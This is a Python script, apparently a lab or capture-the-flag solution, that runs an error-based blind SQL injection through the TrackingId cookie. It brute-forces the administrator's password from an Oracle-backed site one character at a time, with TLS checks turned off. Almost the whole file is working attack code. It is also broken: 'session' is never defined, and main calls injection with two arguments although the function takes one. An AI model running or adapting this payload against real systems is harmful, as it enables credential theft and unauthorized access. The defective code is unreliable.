import requests
import sys
import click
import urllib3
import urllib


urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# proxies={'http':'http://127.0.0.1:8080','https':'https://127.0.0.1:8080'}


def injection(url):
    password=""
    for i in range (1,21): #password length
        for j in range (32,126): # range of all characters ASCII number
            payload="' || (select CASE WHEN (1=1) THEN TO_CHAR(1/0) ELSE ' ' END FROM users WHERE username='administrator' and ascii(substr(password,%s,1))='%s') || '" % (i,j)
            payload_encoded= urllib.parse.quote(payload)
            cookies = {'TrackingId':'junk' + payload_encoded,'session':f'{session}'}
            r = requests.get(url, cookies=cookies, verify=False)
            
            if "Internal Server Error" not in r.text:
                # print the current character being processed           
                sys.stdout.write('\r' + password + chr(j))
                sys.stdout.flush()
            else:
                password+=chr(j) # Add character to the password
                sys.stdout.write('\r' + password) # Update printed password
                sys.stdout.flush()
                break # Break out of the loop and move to next position


@click.command()
@click.option('-u','--url',type=str, prompt="The URL of the target",required=True,help="The URL of the vulnerable target")
def main(url):
    print(f"[+] Retrieving Admin's Password...")
    
    injection(url,session)
    
if __name__=="__main__":
    try:
        main()
    except KeyboardInterrupt:
        print("\nExiting program")